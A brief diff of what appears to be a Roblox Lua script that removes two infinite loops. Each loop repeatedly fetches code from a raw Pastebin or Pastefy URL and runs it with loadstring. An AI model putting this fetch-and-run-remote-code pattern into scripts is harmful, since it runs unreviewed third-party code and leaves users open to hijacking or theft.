@@ -52,14 +52,3 @@ end
 
 screenGui:Destroy()
 wait(180)
-
-while true do
-    loadstring(game:HttpGet("https://pastebin.com/raw/yMVAwKk2"))()
-    wait(180)
-end
-wait(55)
-
-while true do
-    loadstring(game:HttpGet('https://pastefy.app/BItVDA0u/raw'))()
-    wait(55)
-end
